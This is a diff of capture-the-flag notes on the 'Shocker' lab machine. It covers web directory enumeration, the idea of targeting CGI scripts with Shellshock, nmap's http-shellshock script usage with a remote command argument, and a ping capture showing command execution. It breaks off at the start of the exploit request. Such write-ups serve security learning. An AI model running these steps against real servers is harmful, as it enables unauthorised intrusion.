@@ -24,6 +24,13 @@ Nmap done: 1 IP address (1 host up) scanned in 35.91 seconds
                                                                
 ```
 
+
+Apache 2.4.18
+Ubuntu 7.2p2 4ubuntu2.2
+https://launchpad.net/ubuntu/+source/openssh/1:7.2p2-4ubuntu2.2
+
+
+
 ## Gobuster
 ```
 gobuster dir -u http://shocker.htb/ -w /usr/share/wordlists/dirb/common.txt
@@ -53,7 +60,10 @@ Progress: 4594 / 4615 (99.54%)==================================================
 ```
 
 CGI program???
-/cgi-bin/ is a directory
+/cgi-bin/ is a directory and it might have some sort of scripting language based codes like bash.
+
+
+status 403 so the directory exists but we are not allowed to access it.
 
 ## Feroxbuster
 ```
@@ -93,9 +103,38 @@ Just an uptime test script
 ```
 
 
+https://www.youtube.com/watch?v=IBlTdguhgfY
+###
+Get request
+![[Pasted image 20230216183854.png]]
+
+Content-Type is text/x-sh, but there is a blank line, so bash does not know what to do so it saves the content as a file.
+
+
 # Foothold
 ## Shellshock
 
+Cgi is often vulnerable to shellshock, so shellshock is the direction we are going for.
+
+## NSE (Nmap Script Engine)
+```
+locate nse | grep shellshock
+/usr/share/nmap/scripts/http-shellshock.nse
+```
+
+### 
+```
+less /usr/share/nmap/scripts/http-shellshock.nse
+---
+-- @usage
+-- nmap -sV -p- --script http-shellshock <target>
+-- nmap -sV -p- --script http-shellshock --script-args uri=/cgi-bin/bin,cmd=ls <target>
+-- @output
+-- PORT   STATE SERVICE REASON
+-- 80/tcp open  http    syn-ack
+-- | http-shellshock:
+
+```
 
 ![[Pasted image 20230216172207.png]]
 
@@ -108,7 +147,7 @@ listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
 03:27:44.284907 IP 10.10.14.36 > shocker.htb: ICMP echo reply, id 1595, seq 1, length 64
 ```
 
-### RCE
+### Shellshock request
 ```
 GET /cgi-bin/user.sh HTTP/1.1
 Host: shocker.htb
